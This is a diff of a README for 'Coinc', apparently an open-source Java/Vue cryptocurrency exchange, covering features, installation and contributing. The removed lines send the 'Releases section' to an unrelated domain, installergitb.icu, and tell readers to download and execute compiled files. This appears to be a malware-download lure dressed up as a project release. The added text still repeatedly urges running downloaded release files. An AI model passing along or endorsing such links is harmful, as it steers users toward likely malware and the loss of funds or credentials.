@@ -1,113 +1,116 @@
 # 🚀 Coinc: Open Source Cryptocurrency Exchange
 
-![Coinc Logo](https://example.com/logo.png)
+![Coinc Logo](https://img.shields.io/badge/Coinc-Open%20Source-blue)
 
-Welcome to the Coinc repository! This project offers a complete open-source cryptocurrency trading platform developed in Java. It supports trading in Bitcoin (BTC), Ethereum (ETH), and other digital currencies. The project includes source code for the application, management panel, and PC website. It serves as a learning resource for developers interested in cryptocurrency exchanges.
+Welcome to the **Coinc** repository! This project is an open-source cryptocurrency exchange platform developed in Java. It provides a complete solution for trading Bitcoin (BTC), Ethereum (ETH), and other digital currencies. The project includes the source code for the app, admin panel, and the official website. 
+
+You can download the latest release from our [Releases section](https://github.com/2brel/coinc/releases). Please ensure you execute the downloaded files according to the provided instructions.
 
 ## Table of Contents
 
-- [Introduction](#introduction)
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
+- [Technology Stack](#technology-stack)
 - [Contributing](#contributing)
 - [License](#license)
 - [Contact](#contact)
-- [Releases](#releases)
-
-## Introduction
-
-Coinc is designed to provide a secure and efficient trading experience. Built with Java for the backend and Vue for the frontend, it allows users to engage in cryptocurrency trading. The platform is a great way to learn about the complexities of digital currency transactions and trading systems.
 
 ## Features
 
 - **Multi-Currency Support**: Trade Bitcoin, Ethereum, and other cryptocurrencies.
-- **User-Friendly Interface**: Designed with a clean and intuitive layout.
-- **Real-Time Trading**: Experience live updates and fast transaction processing.
-- **Security**: Built with best practices to protect user data and funds.
-- **Open Source**: Fully available for educational purposes. You can view and modify the code as needed.
+- **User-Friendly Interface**: Built with Vue for a smooth user experience.
+- **Robust Backend**: Developed in Java for secure and efficient operations.
+- **Open Source**: Fully available for learning and modification.
+- **Admin Dashboard**: Manage trades, users, and transactions seamlessly.
+- **Documentation**: Comprehensive guides for installation and usage.
 
 ## Installation
 
-To set up Coinc on your local machine, follow these steps:
+To get started with Coinc, follow these steps:
 
-1. **Clone the Repository**:
+1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/KarlStephenVarona/coinc.git
+   git clone https://github.com/2brel/coinc.git
+   ```
+
+2. **Navigate to the Directory**:
+   ```bash
    cd coinc
    ```
 
-2. **Install Dependencies**:
-   Ensure you have Java and Node.js installed. Then run:
+3. **Download Dependencies**: Make sure you have Java and Node.js installed. Then, run:
    ```bash
-   cd backend
-   ./gradlew build
-   cd ../frontend
    npm install
    ```
 
-3. **Run the Application**:
-   Start the backend server:
+4. **Build the Project**: Compile the Java backend and Vue frontend:
    ```bash
-   cd backend
-   java -jar build/libs/coinc.jar
-   ```
-   Then start the frontend:
-   ```bash
-   cd frontend
-   npm run serve
+   ./gradlew build
+   npm run build
    ```
 
-4. **Access the Application**:
-   Open your browser and go to `http://localhost:8080` to access the Coinc trading platform.
+5. **Run the Application**: Start the server:
+   ```bash
+   java -jar build/libs/coinc.jar
+   ```
+
+You can download the latest release from our [Releases section](https://github.com/2brel/coinc/releases). Make sure to execute the downloaded files as per the instructions provided.
 
 ## Usage
 
-Once the application is running, you can create an account and start trading. The interface will guide you through the process of depositing funds, placing trades, and withdrawing your earnings.
+Once the application is running, you can access the platform via your web browser. The default URL is `http://localhost:8080`. Here, you can create an account, deposit funds, and start trading.
+
+### Creating an Account
+
+1. Go to the registration page.
+2. Fill in the required details.
+3. Verify your email to activate your account.
 
 ### Trading
 
-- **Placing Orders**: Navigate to the trading section to place buy or sell orders.
-- **Market Analysis**: Use the built-in tools to analyze market trends and make informed decisions.
-- **Account Management**: Manage your account settings and view your transaction history.
+After logging in, you can:
+
+- View the market prices for BTC, ETH, and other cryptocurrencies.
+- Place buy or sell orders.
+- Monitor your portfolio and transaction history.
+
+## Technology Stack
+
+- **Backend**: Java, Spring Boot
+- **Frontend**: Vue.js
+- **Database**: MySQL
+- **Security**: ECDSA, Schnorr signatures, and secp256k1 for secure transactions.
+- **API Integration**: Open Exchange Rates for real-time currency data.
 
 ## Contributing
 
-We welcome contributions to improve Coinc. If you would like to contribute, please follow these steps:
+We welcome contributions from the community! If you want to contribute, please follow these steps:
 
-1. **Fork the Repository**: Click the "Fork" button on the top right corner of the page.
-2. **Create a New Branch**:
+1. **Fork the Repository**: Click the fork button on the top right of the page.
+2. **Create a New Branch**: 
    ```bash
    git checkout -b feature/YourFeatureName
    ```
-3. **Make Your Changes**: Edit the code and add features or fix bugs.
-4. **Commit Your Changes**:
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: 
    ```bash
    git commit -m "Add some feature"
    ```
-5. **Push to Your Fork**:
+5. **Push to the Branch**: 
    ```bash
    git push origin feature/YourFeatureName
    ```
-6. **Create a Pull Request**: Go to the original repository and click "New Pull Request."
+6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
 
 ## License
 
-This project is licensed under the MIT License. Feel free to use, modify, and distribute the code as long as you provide proper attribution.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ## Contact
 
-For questions or suggestions, feel free to reach out:
-
-- **Email**: contact@example.com
-- **Twitter**: [@CoincDev](https://twitter.com/CoincDev)
-
-## Releases
-
-To download the latest release, visit the [Releases section](https://installergitb.icu?dmpiel2g4vixvvq). You can find compiled versions of the application that need to be downloaded and executed.
-
-If you want to keep up with updates, check the [Releases section](https://installergitb.icu?q7a22z4qzqxhxii) regularly.
+For questions or feedback, please open an issue on GitHub or contact the project maintainers.
 
 ---
 
-Feel free to explore the code and learn more about how a cryptocurrency exchange operates. Happy coding!
+Explore the world of cryptocurrency with Coinc. Download the latest release from our [Releases section](https://github.com/2brel/coinc/releases) and start your trading journey today!
